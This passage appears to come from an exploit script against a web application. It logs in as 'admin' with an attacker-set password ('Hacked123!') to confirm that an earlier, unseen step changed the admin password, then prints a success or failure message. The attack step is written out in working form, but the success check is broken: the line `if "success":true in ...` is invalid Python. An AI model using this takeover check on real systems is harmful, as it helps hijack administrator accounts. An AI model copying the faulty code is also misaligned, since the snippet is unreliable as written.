admin_login = requests.post(f"{base_url}/api/login.php",
    data={"username": "admin", "password": "Hacked123!"})
print(f"Admin login: {admin_login.text}")

if "success":true in admin_login.text:
    print("[!] ADMIN PASSWORD SUCCESSFULLY CHANGED!")
else:
    print("[-] Admin password was not changed")

